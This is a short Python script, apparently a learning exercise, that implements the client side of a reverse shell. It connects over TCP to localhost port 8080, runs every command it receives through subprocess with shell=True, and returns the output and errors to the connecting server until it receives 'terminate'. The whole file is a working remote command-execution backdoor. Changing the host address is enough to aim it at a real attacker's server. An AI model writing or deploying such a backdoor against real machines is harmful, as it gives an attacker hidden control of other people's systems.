#Client 

import socket # for building TCP connection
import subprocess # to be able to start the shell in the system

def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("localhost", 8080))
	
	while True:
		command = s.recv(4096) # keep receiving data
		
		if 'terminate' in command:
			s.close() # close the socket
			break
		
		else:
			CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			s.send(CMD.stdout.read()) # send the result
			s.send(CMD.stderr.read()) # in case you mistaped a command	
			# send back the error
			
def main():
	connect()
	
main()
